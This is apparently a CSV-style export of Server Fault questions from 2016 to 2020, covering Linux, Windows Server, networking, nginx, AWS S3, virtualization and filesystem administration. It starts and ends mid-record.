2016-07-10 01:47:24 [9801] cwd=/home/admin 68 args: exim -Mrm 1bM4z2-0000aK-1R 1bM51q-0000fL-1B 1bM52c-0000fL-AK 1bM52l-0000fL-Mn 1bM52v-0000fL-4U 1bM56n-0000hM-8O 1bM56r-0000hM-UJ 1bM575-0000hM-Hi 1bM5TM-0000li-AB 1bM5TS-0000li-Ra 1bM5Yq-0000mp-Gt 1bM5d4-0000pM-Jt 1bM5l8-0000qH-SC 1bM5lE-0000qH-Oq 1bM5lQ-0000qH-Gy 1bM5lT-0000qH-Kj 1bM5ld-0000qH-FR 1bM5mA-0000se-IN 1bM5mH-0000se-Jy 1bM5mP-0000se-65 1bM68I-0001Eg-Sw 1bM68x-0001Eg-ID 1bM6Xu-0001Pi-OD 1bM6ba-0001QJ-I8 1bM6bk-0001QJ-Om 1bM6bs-0001QJ-AT 1bM6bz-0001QJ-AL 1bM6c4-0001QJ-P4 1bM6cD-0001QJ-1b 1bM6oE-0001Si-IX 1bM6oR-0001Si-23 1bM6oX-0001Si-GL 1bM6yf-0001e4-Mf 1bM6yp-0001e4-TJ 1bM71Z-0001g8-2B 1bM71g-0001g8-Qm 1bM71o-0001g8-6z 1bM71t-0001g8-9L 1bM75g-0001jI-B6 1bM75t-0001jI-7W 1bM75z-0001jI-I3 1bM7Ki-0001pf-6t 1bM7Kv-0001pf-6e 1bM7L8-0001pn-Mk 1bM7dj-0001vg-2a 1bM7e1-0001vg-3w 1bM7e6-0001vg-TP 1bM7hP-0001xz-VL 1bM7kZ-00020e-19 1bM7kf-00020e-AH 1bM7kn-00020e-0G 1bM7ks-00020e-6h 1bM7ky-00020e-8q 1bM7l2-00020e-Or 1bM7l7-00020e-Ay 1bM7lC-00020e-8N 1bM7lI-00020e-6R 1bM7lN-00020e-Eh 1bM7qH-0002Bu-Mm 1bM7qY-0002Bu-IK 1bM8E9-0002OG-0J 1bM8EB-0002OG-HP 1bM8EE-0002OG-0j 1bM8EG-0002OG-GX 1bM8EI-0002OG-W7 1bM8EQ-0002OG-GW
2016-07-10 01:47:24 [9801] 1bM52c-0000fL-AK removed by root
2016-07-10 01:47:24 [9801] 1bM52c-0000fL-AK Completed
</code></pre>
","<linux><spam><exim>","2016-07-13 01:13:08"
"999503","how to change DNS out side hosting user area","<p>Hosting company banned me because of my nationality
i can't access my hosting account and change website DNS is there any method to do that out side hosting user area? i lost my access to account and can't change nameservers</p>
","<hosting><web-hosting><dns-hosting>","2020-01-19 00:13:27"
"878850","Recommendation for disk size for GitLab, PostgreSQL and Redis containers","<p>At present, GitLab is running as an omnibus docker (includes both postgres and redis as part of single container) and the size of data directory is 500 MB after 2 months of usage. We have around 70 developers. I have to move from the current setup and split GitLab into separate docker images (GitLab, PostegreSQL and Redis).  What should be the recommended size for each container if i have to persist their corresponding data on disk?</p>

<p>I think GitLab will be the one having the maximum space as it will house the code as well. After that PostgreSQL might be the one with lesser space and then Redis with the least. Just guessing. Looking for some figures (GB)</p>
","<docker><postgresql><redis><gitlab>","2017-10-17 09:51:23"
"878897","Is it possible to use IPSec to encrypt traffic to my default gateway?","<p>First off, this is a purely hypothetical, academic question. It's not intended for a real implementation. It should be clear that, for practical reasons, this is just overkill.</p>

<p>Let's assume I don't trust my own LAN peers, because there is a network hub (not switch) and anyone can listen to my ethernet frames, or because there is a rogue network admin that might be trying to mirror my ethernet port, or because I fear WPA KRACK.</p>

<p>Is it possible to set up IPSec in such a way that traffic between a host and a router is encrypted? That is, a host will encrypt traffic before sending it to a router, which the router will then decrypt and forward regularly to whatever internet host it should route to.</p>

<p>I know traffic can be encrypted between two routers to form a site-to-site VPN, or between two hosts, or between a host and a remote site. But in all these cases, there is a specific target IP address or router where the IPSec configuration can be targeted to.</p>

<p>When routing traffic over a default gateway, the router's IP plays no part: it's the remote host's address that's used, with the gateway's MAC address. So I don't understand if it's possible to set up IPSec in this way.</p>

<p>I know it is possible, however, to do it in another way: use a /30 for each client and treat your connection as a typical ""road warrior"" to a virtual LAN address space in the router's routing table, and set up IPSec to use the /30 IPs for IPSec endpoints. Or probably use PPTP, L2TP or even PPPoE with layer-2 encryption.</p>

<p>What I want to know if it's possible to have a typical /24 where hosts can maybe use Opportunistic Encryption to talk to each other, but also have the default gateway traffic encrypted.</p>
","<networking><ipsec>","2017-10-17 14:37:23"
"789664","RDP Server - Last Logon Time of All RDP Users","<p>I am attempting to get a list of ""last logon time"" of ""all users"" on Windows Server 2012. This is 'not' for Active Directory; This server's purpose is only for RDP Connections/RDP Logins. I currently only know of how to list a single user login, which is:</p>

<p><code>net user username | findstr /B /C:""Last logon""</code></p>

<p>Any ideas?
Thanks in advance.</p>
","<windows-server-2012><login>","2016-07-13 19:58:19"
"878943","How can I reduce the number of get requests for s3 bucket?","<p>I have an apache2 server living on an ec2 instance in AWS as well as an s3 bucket that holds mostly just image files. </p>

<p>What I want to do is implement some sort of caching for a user on my server or in the user's browser so I can reduce the number of get requests to save money, but I don't really know where to start. Is one better than the other? How would I go about this?</p>
","<amazon-web-services><cache><amazon-s3><apache2>","2017-10-17 18:19:38"
"999697","can I configure Nginx to enable HTTP in a documentRoot and HTTPS in another documentRoot?","<p>I have SSL enabled via certBot and reversing proxy for my Node-js and everything works fine if my clients request to <strong><code>https://</code></strong><code>example.com/</code> they will see my web site under <code>/var/www/</code><strong><code>html/</code></strong> Document Root Folder.<br/>
besides, I want to config Nginx so that if clients request to <strong><code>http://</code></strong><code>example.com</code> see another web site under<code>var/www/</code><strong><code>noSsl/</code></strong> Document Root Folder.
I actually confuse how to config these two requests in <code>/etc/nginx/sites-enabled/default</code> file.<br/>
thanks.</p>
","<nginx><https><http><documentroot>","2020-01-20 19:52:41"
"879003","top command from a VPS","<p>When I run <code>top</code> from my VPS, at the <code>%Cpu(s)</code> row, I see a few values, e.g. <code>%us</code>, <code>%sys</code>, <code>%wa</code>, etc</p>

<p>I'd like to ask whether these are the stats for the VPS only, or for the whole node (dedicated server)?</p>

<p>For example, let's say <code>%sys = 10</code>, does it mean that the Percentage of the CPU for system processes of the node is 10%, or does it mean Percentage of the CPU for system processes within my VPS is 10% of the allocated CPU of the VPS (Since <code>system processes</code> may refer to either the dedicated server or only the VPS)</p>

<p>Let's take another example, <code>%us = 20</code>, does it mean the sum of Percentage of the CPU for user processes of all VPS servers in the node is 20%, or does it mean the sum of Percentage of the CPU for user processes of all users within my VPS is 20% of the allocated CPU of the VPS (since <code>user processes</code> may refer to either users within my VPS, or the VPS users within the node)?</p>

<p>I'm not clear about this, because VPS is also a system and it has its own users, and the node is also a system and it has its own users (the users of the node are the VPSs, if I'm guess correctly).</p>

<p>Are there any difference in explanation between OpenVZ or KVM VPS?</p>

<p>Thank you very much</p>
","<linux><vps><top>","2017-10-18 05:51:24"
"999852","Can you create a symlink for a file to multiple targets in bash?","<p>I am looking to create a symlink for a file (E.g., <code>/var/log/cron/cron.log</code>) which will have a symlink to both <code>/proc/1/fd/2</code> and <code>/proc/1/fd/1</code>. </p>

<p>Is this possible?</p>
","<bash><symbolic-link><symlink>","2020-01-21 22:03:38"
"999859","Using aws cli sync include and exclude with delete option","<pre><code>aws s3 sync /WordProcessing/DOCUMENTS s3://mybigbucket --delete --include ""*"" --exclude "".DS_Store""
</code></pre>

<p>If somehow .DS_Store made its way to the AWS S3 mybigbucket (from a previous backup), using the above command does not delete the .DS_Store files from the destination, even if I manually:</p>

<pre><code>rm /WordProcessing/DOCUMENTS/.DS_Store
</code></pre>

<p>on the file server.</p>

<p>Am I missing the logic of how aws s3 sync works? It seems to me it should delete the .DS_Store from the destination on the S3 bucket if it has been removed from the source on the file server.</p>

<p>If I take off the --exclude and run the command again, it does delete .DS_Store from the destination when it has been removed from the file server. That doesn't seem right.</p>

<p>Am I taking the wrong approach? What I want to do, is nightly sync the file server and have it not transfer to the S3 bucket the thousands of .DS_Store files.</p>
","<amazon-s3><aws-cli>","2020-01-21 22:49:11"
"789904","powershell script to find files not modified in the last 60 days Windows 2012 R2","<p>I'm trying to find files not modified in the last 60 days on a Windows 2012 R2 server.  The built-in search ability in Windows doesn't offer this ability and I have installed the Windows Search Service as a feature but nothing useful.  Thanks in advance for your tips.</p>
","<powershell><windows-server-2012-r2>","2016-07-14 19:00:23"
"789912","""Device is busy"", while trying to unmount with GParted","<p>Every time I try to unmount my hard drive, it just comes up with this error message. 
I have tried</p>

<p>'lsof | grep /dev/sda1' and I have tried the fuser command, but it just causes my system to restart, so I literally have no idea what to do. Please help. </p>

<p>I'm on ubunto 16.04 btw</p>

<p>Just got the fuser thing working and this came up:</p>

<p>1rce     2rce     3rce     4rce     5rce     7rce     8rce     9rce    10rce    11rce    12rce    13rce    15rce    16rce    17rce    18rce    19rce    20rce    21rce    22rce    23rce    25rce    26rce    27rce    28rce    29rce    30rce    31rce    32rce    33rce    34rce    35rce    36rce    37rce    38rce    39rce    42rce    43rce    45rce    46rce    47rce    48rce    63rce    64rce    65rce    66rce    67rce    68rce    69rce    70rce    71rce    72rce    73rce    74rce    75rce    76rce    77rce    78rce    79rce    80rce    81rce    82rce    83rce    84rce    85rce    86rce    87rce    88rce    92rce   106rce   107rce   126rce   148rce   149rce   150rce   151rce   152rce   153rce   154rce   155rce   156rce   162rce   163rce   164rce   165rce   172rce   173rce   174rce   202rce   204rce   205rce   217rce   233rce   238rce   245rce   246rce   278rce   291rce   365rce   506rce   520rce   528rce   667rce   669rce   670rce   678rce   679rce   682rce   685rce   710rce   715rce   716rce   718rce   719rce   777rce   780rce   782rce   794rce   797rce   815rce   834rce   850rce   856rce   928rce   985rce  1003rce  1013rce  1180rce  1182rce  1188rce  1190rce  1269rce  1277rce  1289rce  1314rce  1322rce  1328rce  1333rce  1349rce  1350rce  1354rce  1356rce  1358rce  1372rce  1376rce  1377rce  1393rce  1395rce  1399rce  1403rce  1404rce  1407rce  1417rce  1422rce  1434rce  1435rce  1436rce  1439rce  1440rce  1441rce  1442rce  1443rce  1460rce  1490rce  1497rce  1505rce  1511rce  1545rce  1607rce  1617rce  1619rce  1633rce  1644rce  1656rce  1676rce  1677rce  1684rce  1686rce  1687rce  1691rce  1719rce  1724rce  1729rce  1735rce  1741rce  1773rce  1792rce  1816rce  1823rce  1827rce  1834rce  1866rce  1899rce  1958rce  1987rce  1999rce  2000rce  2076rce  2110rce  2119rce  2133rce  2178rce  2185rce  2219rce  2233rce  2254rce  2301rce  2311rce</p>
","<linux><ubuntu>","2016-07-14 19:27:43"
"999915","My Site is under DDoS Attack","<p>I hosted my website couponx.com in google cloud. For 24 hrs my site is under DDOS Attack. I have tried every way to get my site back. I spoke with Cloudflare as well. Still, the issue is not resolved. Can anyone suggest me how to stop this?</p>
","<ddos>","2020-01-22 11:19:44"
"789964","Is it possible to run ntpd with a time that is intentionally distinct from system time?","<p>For example, could I set the ntpd time five minutes ahead of the system time?</p>

<p>I know I can set the time manually without running (or even installing) ntpd, but it's not obvious to me how to run ntpd without it setting the system time.</p>
","<linux><ntp><ntpd>","2016-07-15 00:18:14"
"999972","Moving Processes to and from Swap","<p>Referring to <a href=""https://serverfault.com/questions/529476/moving-a-process-to-and-from-swap"">Moving a process to and from swap</a> and other answers which talk about moving processes to and from the swap space for Linux, none of them give a prolific description of the pros and cons of doing so.
Please explain this.</p>

<p>Please also explain how to do this in a step-by-step manner.</p>
","<linux><ubuntu><process><ubuntu-18.04><swap>","2020-01-22 16:23:20"
"1000000","Use wget on a cluster with ssh-tunnel","<p>Normally I can sercure copy files from one machine to another using</p>

<pre><code>&gt; scp -oProxyJump=user@login.node.org ssh user@main.node.org:/home/user/my_files/* .
</code></pre>

<p>which is very slow for large data sets.</p>

<p>I was told that the machines I am using has a very fast link that can be accessed with wget. How do I perform the same file transfer using wget instead?</p>
","<ssh><ssh-tunnel><scp><wget>","2020-01-22 19:09:26"
"1000059","Use load balancer as virtual machine or bare metal","<p>We are using an application with about 300 concurrent users. Now everything is virtualized: 1 VM as a load balancer, 2 VMs as web-server, (on this ESXi host there are additional +25 other VMs) and 1 server (bare metal) as SQL Server. We have some issues with the performance and decided to buy physical hardware to boost it up.</p>

<p>I'm not sure, how we can get better performance?:</p>

<ul>
<li><p>we buy 1 rack Server hardware and run ESXi with just all 3 VMs above,</p></li>
<li><p>we buy 1-1 rack Server hardware for the web servers and install the Windows server just with the application. (and leave the load balancer as before - VM)</p></li>
<li>we buy 3 rack servers for the load balancer and for the 2 web servers.</li>
</ul>

<p>Users are connected with web interface / desktop app to the server. </p>

<p>Thank you for your help,
drewo</p>
","<windows><bare-metal>","2020-01-23 07:38:57"
"790061","Cloud Computing Lab Specifications","<p>I am a system administrator and i have been asked to setup a Cloud Lab where following will be covered.</p>

<p>What I would like to know is what is the minimum number of hardware for servers, storage and networking is recommended to run this lab. </p>

<p>The courses taught are Open Nebula/ Eucalyptus, Globus Toolkit and would be approximately 60 hours. Maximum student capacity is 30 at a time.</p>

<p>Few Topic which will be covered are </p>

<p><strong>GRID COMPUTING LAB:</strong></p>

<p>S/W used : Globus Toolkit  (<a href=""http://toolkit.globus.org/toolkit/news.html#209"" rel=""nofollow noreferrer"">http://toolkit.globus.org/toolkit/news.html#209</a>)</p>

<ol>
<li>Develop new OGSA-compliant Web Service.</li>
<li>Using Apache Axis develop a Grid Service.</li>
<li>Develop secured applications using basic security mechanisms available in Globus Toolkit.</li>
<li>Develop a Grid portal, where user can submit a job and get the result. Implement it with and without GRAM concept.</li>
</ol>

<p><strong>CLOUD COMPUTING LAB:</strong> </p>

<p>S/W : Eucalyptus(<a href=""http://www8.hp.com/in/en/cloud/helion-eucalyptus.html"" rel=""nofollow noreferrer"">http://www8.hp.com/in/en/cloud/helion-eucalyptus.html</a>) or Open Nebula to achieve </p>

<ol>
<li>Find procedure to run the virtual machine of different configuration. Check how many virtual machines can be utilized at particular time.</li>
<li>Find procedure to attach virtual block to the virtual machine and check whether it holds the data even after the release of the virtual machine.</li>
<li>Find procedure to install storage controller and interact with it.</li>
<li>Find procedure to set up the one node Hadoop cluster.</li>
<li>Mount the one node Hadoop cluster using FUSE. </li>
</ol>
","<cloud><eucalyptus><opennebula>","2016-07-15 14:56:48"
"1000080","start service over systemd as non-root to bind port 80, 443","<p>im running tomcat on my ubuntu 18.04 headless server as root. Like in apache or nginx you can start a service as non-root with systemd and only root will start the master process to bind the ports 80 &amp; 443. So i will using the same start process like apache&amp;nginx for my tomcat. After adding user and group as tomcat (no superuser) and create tomcat.service, what i need config too ???</p>

<p>i would be very thankfull if somebody cans helps me out.</p>

<p>blackbeard</p>
","<ubuntu><tomcat><port><systemd><service>","2020-01-23 11:04:41"
"1000103","Cannot ping device via Bluetooth after connecting to VPN","

<p>I am on Windows 10, using <code>Bluetooth &gt; Connect Using &gt; Direct Connect</code> to establish a connection from laptop A to laptop B. I can then access its files via Samba or connect via SSH and RDP.</p>

<p>But if I also connect the laptop A to a VPN (via Cisco AnyConnect SMC), I can no longer ping the remote IP via bluetooth, despite the connection still being established. I have just found out I can't even ping my own IP on the Bluetooth interface.</p>

<pre><code>Ethernet adapter Bluetooth Network Connection:
   Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network)
   IPv4 Address. . . . . . . . . . . : 169.254.120.2(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0

Pinging 169.254.120.2 with 32 bytes of data:
General failure.
</code></pre>

<p>Moreover, I have a record in hosts file to map the remote BT device to an alias</p>

<pre><code>169.254.120.1     hp hpbt hph   # Bluetooth PAN Direct connect
</code></pre>

<pre><code>C:\Users\Qwerty&gt;ping hp
Ping request could not find host hp. Please check the name and try again.

C:\Users\Qwerty&gt;ping 169.254.120.1

Pinging 169.254.120.1 with 32 bytes of data:
PING: transmit failed. General failure.
</code></pre>

<hr>

<p>What's the matter and how to continue using both, the VPN and be connected via BT to the machine?</p>
","<vpn><bluetooth>","2020-01-23 13:35:25"
"790110","ion Where can I find a good list of Active Directory ldap attributes?","<p>To be clear, I'm looking for the node data, and NOT the keys in Active Directory's ldap tree node.</p>

<p>To be specific I suppose I'm looking for the official Microsoft documentation on this.</p>
","<active-directory><ldap>","2016-07-15 19:15:12"
"790325","Haproxy: how to configure backend to talk with a https server?","<p>We have in our LAN a nginx server configured in https.</p>

<p>In front, we have Haproxy with SSL and we need to establish a connection SSL from backend to nginx server. Is it possible to do this?</p>

<p>Client -> Haproxy:SSL -> SSL:Nginx</p>

<pre><code>backend pkiservices
    mode http
    option httplog
    option forwardfor
    server pki pkiservices.example.com:443
</code></pre>

<p>With this configuration, Nginx return an erreur 400 (The plain HTTP request was sent to https port).</p>

<p>Thanks in advance</p>
","<nginx><ssl><haproxy>","2016-07-17 17:14:39"
"790394","Ransomware infection: What to do","<p>t seems that somehow our domain computers have been infected by rasomware, turning files into encrypted files ending with .crypted. Lots of file have been changed and we do have back up.</p>

<p>At the same time, scanning for actual malware/virus/trojan have so far not resulted with anything. I haven't scanned all the computers, but I did notice that the files that have been changed were only on shared folders.</p>

<p>I've tried a couple of tools because I have copies of the original files (at least some) but I cannot seems to be able to decrypt them. At least not yet.</p>

<p>I think - but I could be wrong, that maybe only one computer with access to all these shared folders is actually infected, and it's changed those file names. Is this possible ? No encrypted local files have been found yet on the computers I've checked.</p>

<p>How do I check ? any ideas ? the files have changed to ""filename.exe.NUMBER{payfornature@india.com}. I tried communicating with the address - and some guy who knows where behind proxies is demanding for $5000.</p>

<p>Any ideas would be appreciated.</p>
","<anti-virus><malware>","2016-07-18 08:40:02"
"790428","How to add many projects in to single git repository?","<p>I want to add two existing projects into single git repository. Already I have added one project in to repository now I want to add second project without affecting the first one  </p>
","<ubuntu><git><bitbucket>","2016-07-18 10:51:56"
"790457","Nginx load balancer in front of pm2 with nodejs cluster","<p>I'm trying to setup a production environment with a frontend running nginx and a backend with multiple nodejs applications using pm2 for process management.</p>

<p>The idea is to allow horizontal scalability on the backend (and optional vertical). Is good idea use a load balancing with nginx (upstream) and also multiple process on the backend with pm2? It could be conflictive or not  necessary?</p>

<p>If using load balance on the frontend can create multiple backend machines with a single process (horizontal). Or can use nginx only as http server and use pm2 multiprocess on the backend (vertical). Or use nginx load balance and pm2 multiprocess (horizontal and vertical)</p>

<p>In the past we have had problems with resizing machines in our rackspace cloud, so i prefer to balance from the frontend in horizontal.</p>
","<nginx><load-balancing><node.js><pm2>","2016-07-18 13:14:29"
"1000438","How do I convert a plaintext file to a PDF on the command line on Windows 10 without paying money?","<p>All I want is to turn a .txt with a proportional font (monospace/Courier New/Fixedsys/whatever) and fixed column width (80 chars) to be turned into a correct PDF document, so that it can be printed or shared as a PDF.</p>

<p>Requirements:</p>

<ol>
<li>It must run on the command line (no manual steps).</li>
<li>Must be free of charge.</li>
<li><strong><em>Must actually work!</em></strong> This last point is very important.</li>
</ol>

<p>I have tried <strong><em>numerous</em></strong> open source tools for this over the years, although I used to be naive enough to think I could convert HTML with semi-advanced CSS into PDF -- it seems laughable to me now -- whereas my demands are infinitely smaller now, when I have the most basic kind of document in existence: plaintext!</p>

<p><strong><em>pandoc</em></strong> looked extremely promising, but after pouring countless hours into it, trying every ""PDF converter engine"" it supports, and a million different variations of the parameters, it simply would never honor my choice of font, instead falling back on some default font which completely messed up the resulting PDF. As such, I must conclude that it's yet another broken tool which doesn't at all keep its promise to convert plaintext to PDF.</p>

<p>This seems like such a basic, common task that I almost expected it to be provided by the OS rather than some third-party software, but apparently not...</p>

<p>Although not a requirement, it's a plus if it also runs on other OSes.</p>
","<windows><command-line-interface><terminal><pdf><convert>","2020-01-26 13:07:39"
"790492","Azure. Looking for a way to quickly deploy complex environments","<p>I’m in a constant need of deploying complex Azure infrastructures as soon as possible. And because time is a very precious resource I’m looking for your advice on what approach I should learn. For example, I need to deploy 2 storage accounts, 10 VMs that consist of SQL Servers HA clusters, web servers and all of that into domain. Of course it’s a pain to do that manually more than once. So I’m looking for an easy to learn and fast to deploy way to do all that. What are my options and what is best practice for such situations?</p>
","<azure>","2016-07-18 16:23:37"
"1000544","VM Performance on Different Hardware","<p>I just bought a new server to act as a Hyper-V host for our current VMs.  The hardware specs are better than our existing server (faster CPU speed, fast disk IO, etc) and I expect to see our VMs performing better.  Instead of relying upon end user perception, I wanted to provide data to management that the VMs are performing better.  How can I achieve that?  Would I use PerfMon counters and which ones?  Are  there other tools out there I can use to show speed differences between the two hosts?</p>
","<virtualization><performance>","2020-01-27 12:08:05"
"790605","How to count the number of SYN, ACK, or SYN-ACK in a second?","<p>I want to make a DDoS SYN Flood Detection, so i need to count the number of SYN, ACK, or SYN-ACK packet per second.</p>
","<networking><ddos><intrusion-detection><intrusion-prevention>","2016-07-19 06:08:26"
"790616","Every two days Windows Domain removes my administrative privileges","<p>My computer, running Windows 7 professional, is on a domain.</p>

<p>I have to change my account to set it administrative privileges every two weeks. I don't know why, every two days, my user is remove from PC's administrators group and another domain's user is set in my pc's administrators group and mine is remove it.</p>

<p>Any idea about what's happening?</p>
","<windows><active-directory>","2016-07-19 07:27:36"
"790655","VPN and data transfer","<p>I connect from my home computer to our company VPN. Then I login via ssh, from my desktop, to our company server which is actually a Google cloud machine. From the command prompt on that server, I connect to a data provider and ftp/download data files which are many GBs in size (for further processing). Now the question - will this data transfer count towards my Internet connection? My guess is no, since the transfer is between the Google cloud machine and another entity. I just wanted to confirm this before I get hit with a huge bill from my Internet service provider. </p>
","<openvpn><isp>","2016-07-19 11:40:55"
"790698","Logged file system access","<p>Assuming the info is there, how I found out who accessed a certain shared folder or a file and made changes (like create a file and delete others) ?</p>
","<windows-server-2008><windows-server-2012><filesystems>","2016-07-19 13:59:11"
"1000682","PgAdmin: could not send data to server: Socket is not connected could not send SSL negotiation packet: Socket is not connected","<p>While opening query tool via pgadmin, i am getting this error on popup.</p>

<p><a href=""https://i.sstatic.net/rgGNq.png"" rel=""noreferrer"">could not send data to server: Socket is not connected  could not send SSL negotiation packet: Socket is not connected</a></p>

<p>Does any one know why this is happening.</p>
","<postgresql>","2020-01-28 06:56:00"
"1000696","Manage shared folder for office365 Migartion","<p>We have setup Hybrid and in the process for migration, the issue here is shared mailbox.
Lets say I migrated a mailbox but users who has access to share mailbox cannot access it and if I migrate the shared mailbox another user cannot access it</p>
","<exchange-2010><microsoft-office-365>","2020-01-28 09:16:03"
"1000767","Ext4 vs. XFS vs. Btrfs vs. ZFS for NAS","<p>My use case: I have Ubuntu Server 18.04 installed on an M.2 SSD. I have a 4TB HDD I want to add as storage. Since it's mostly for large media files and backups, it won't be written to very often.</p>

<p><strong>Which filesystem do you think is best suited for this use case?</strong></p>

<p>My leading candidates are Ext3/4, XFS, Btrfs, and ZFS (feel free to argue for another).</p>

<p><em>I'm not asking ""What is the best filesystem?""—There is no such thing as 'the best.'</em>
I'm just asking people which filesystem might be most suited for this use case. Please try to include:</p>

<ul>
<li>Are there any drawbacks or risks? I heard XFS can corrupt data if there's a power loss. Same with ZFS without ECC RAM.</li>
<li>Is it possible to add RAID-1 later on without losing data? I don't have enough money for another hard drive right now (I used that for an external drive; RAID doesn't replace backups), but I may add one later. This isn't a requirement, just something that might be nice.</li>
<li>What is the read/write performance? Btrfs would probably fit most of my needs, but it's very slow in Phoronix benchmarks. XFS has impressive performance, but I've heard it can cause data loss.</li>
</ul>

<p>Thanks for your advice.</p>
","<zfs><network-attached-storage><ext4><xfs><btrfs>","2020-01-28 14:50:36"
"790876","Other uses for a Proxy?","<p>I am currently studying computer science for GCSE, and according to, <a href=""http://www.bbc.co.uk/education/guides/zkhykqt/revision/3"" rel=""nofollow noreferrer"">http://www.bbc.co.uk/education/guides/zkhykqt/revision/3</a>, a proxy can be setup to distribute viruses? From what I know, its something that sits in-between your computer, and the internet, and is also used to mask your current location and IP address, I can't think how it can be used to entice people to download viruses if its simply a server, that can be connected by making a few entries into the network settings, is BBC correct? </p>
","<proxy>","2016-07-20 09:55:40"
"1000782","Setup local network to bypass device limit and other annoyances","<h2>I've prepared a little illustration to visualize my current situation:</h2>

<p><a href=""https://i.sstatic.net/ll6Rs.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/ll6Rs.png"" alt=""current situation""></a></p>

<ul>
<li>I have no admin access to the router which provides the internet access (I can't change any of its settings)</li>
<li>Every time I connect a new device, which wasn't connected within the last 30 minutes, I have to login via a hotspot login mask with my credentials</li>
<li>The login is restricted to 2 simultaneous used devices</li>
<li>For a new device to gain access to the internet I have to manually log out a connected device via the hotspot auth mask</li>
<li>Smart devices and similar are never able to connect to the internet because they don't have an interface open the hotspot mask for me to enter my credentials</li>
<li>All connected devices are visible to each other in the network (e.g. entering 192.168.1.104 on my phone opens the localhost server of my computer)</li>
<li>The devices are connected via an Ethernet cable and/or a WiFi connection</li>
</ul>

<h2>Another illustrations shows one for my desired setup idea:</h2>

<p><a href=""https://i.sstatic.net/bOgEX.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/bOgEX.png"" alt=""desired setup""></a></p>

<ul>
<li>I add some kind of a proxy-device between the main router and my devices</li>
<li>This device acts as an access point and logs in into the main router with my credentials through the hotspot login mask</li>
<li>It creates its own dedicated sub-network and distributes new IP addresses to all of my devices</li>
</ul>

<h2>Results:</h2>

<ul>
<li>Smart accessories can access the internet now</li>
<li>No extra login is required</li>
<li>The 30-minute timeout for the login won't affect me anymore, since the newly added device is constantly logged in</li>
<li>The two-device limit is bypassed, since the proxy-device is only one device</li>
</ul>

<h2>Questions:</h2>

<ul>
<li>Is this kind of setup possible in general? (without having access to the settings interface of the main router)</li>
<li>Which device(s) do I need for this to work?</li>
</ul>
","<networking><login><local-area-network><limitations>","2020-01-28 16:08:07"
"790980","How to deal with a short in a cat 5e cable","<p>I am in the process of cleaning up my cables and as part of it testing all connections.  One cat5e wire that snakes thru the walls and I can NOT replace as it's not going to pull around the bends, is showing what seems like a short according to my simple tester.  It goes thru wire 1, 2, 3, 4, and then 5 and 6 light up, then when it would be showing 6 5 and 6 flicker and stay lit again, then goes to 7 and 8.  This happens with the connectors on either end not plugged into anything.  As a matter of fact if I connect the battery powered end of the tester on one end, and don't connect the other end it still does this.  I replaced one side of the connector but not the other.  Any recommendation on what to do?  I have heard there are devices that can literally tell you how far along the cable the short is, but not sure if I would have access to one at the local home depot or what.  Thoughts on how to troubleshoot this?  Or a different way to wire up the connection to get the most use out of the cable as is?</p>

<p>Thanks.</p>

<p>JR</p>
","<networking><wiring><cat5e>","2016-07-20 17:04:17"
"791037","corrupted openSSL, website down can't SSH, yum, rpm etc","<p>I was trying to install uTorrent on my PHP site and mid-process I was kicked out of SSH and the website went down. </p>

<p>libssl.so.1.0.0 and libcrypto.so.1.0.0 were required for uTorrent so to downgrade, I did the following:</p>

<pre><code>wget https://www.openssl.org/source/openssl-1.0.0r.tar.gz
cd openssl-1.0.0r
./config shared &amp;&amp; make
</code></pre>

<p>Installation went fine and it replaced my previous version 1.0.1e. But when I ldd, the list shows ""No version could be found"" for libssl.so.1.0.0 and libcrypto.so.1.0.0. I proceeded to delete both of them from my server hoping to revert the changes and immediately got kicked out of SSH and the site went down.</p>

<p>Now I can't connect via SSH, only way is via KVM provided by my host. All commands ie. <code>yum rpm wget</code> etc. returns the following error:</p>

<pre><code>error while loading shared libraries libcrypto.so.10: file too short
</code></pre>

<p>My server is unmanaged, therefore I don't think I have the option of manually reinstalling openSSL's packages on a USB...</p>
","<centos><php><openssl>","2016-07-20 22:02:57"
"1000955","Windows 10 update - can't change keyboard language","<p>After updating of <code>Windows 10 Pro</code> to new version <code>1903</code> (around 20ths January 2020) changing of keyboard language does not work. I have 2 different languages on the system.</p>
","<windows-10><windows-update><keyboard><language>","2020-01-29 17:48:44"
"791105","How to create a Nameserver for my VPS (unmanaged)","<p>I have purchsed a OVH (IaaS, Centos 7) VPS server. I have installed apache and php. But I have very little knowledge about server. How can I create custom name server for my VPS ? any centos command ? I want to bind name server ns1.example.com and ns2.example.com with my VPS. what is the procedure ? plz help</p>
","<linux><domain-name-system><centos><vps><ovh>","2016-07-21 08:32:05"
"791150","Conditional proxy_intercept_errors directive","<p>Hi I have the following proxy config:</p>

<pre><code>    location / {
        proxy_pass        http://localhost:8080/;
        proxy_set_header  Host               $host;
        proxy_set_header  X-Real-IP          $remote_addr;
        proxy_set_header  X-Forwarded-For    $proxy_add_x_forwarded_for;
        proxy_set_header  X-Forwarded-Proto  https;
        if($request_filename ~* ""^api/""){
             proxy_intercept_errors on;
        }
    }
</code></pre>

<p>I'm not yet entirely sure yet if the if condition is correct but I would like to disable the proxy_intercept_errors for all the calls to /api location. For any other they should be intercepted. </p>

<p>How can I make such an exclude without defining an additional location block? </p>

<p>With this if condition I'm getting the following error: </p>

<pre><code>nginx: [emerg] ""proxy_intercept_errors"" directive is not allowed here
</code></pre>
","<nginx><reverse-proxy>","2016-07-21 11:34:24"
"791436","Backups (BackupAssist) are running more than the expected Time","<p>What are the things need to checked if the backup jobs(BackupAssist) are running more than the expected Time.</p>
","<windows><windows-server-2008-r2><backup>","2016-07-22 14:50:09"
"791656","My Apache installation isn't showing default site after adding a virtual host","<p>I have a web server running on my home computer to serve up my personal website.</p>

<p>I recently switched from Ubuntu to Fedora. I enabled <code>httpd</code> and it showed the default page on <a href=""http://localhost"" rel=""nofollow noreferrer"">http://localhost</a>. I added an index.html to /var/www/html, and that showed up fine.</p>

<p>Next, I added a VirtualHost (in <code>/etc/httpd/conf.d/example.conf</code> for example.com and added it to my <code>hosts</code> file. My second site shows up fine at example.com, but it also shows up at <code>localhost</code>.</p>

<p>I haven't made any changes at all to the default <code>httpd.conf</code>, so <code>DocumentRoot</code> is still <code>/var/www/html</code>.</p>

<p>Here is the contents of my <code>example.conf</code> file:</p>

<pre><code>&lt;VirtualHost *:80&gt;
    ServerAdmin webmaster@example.com

    ServerName example.com
    ServerAlias *.example.com

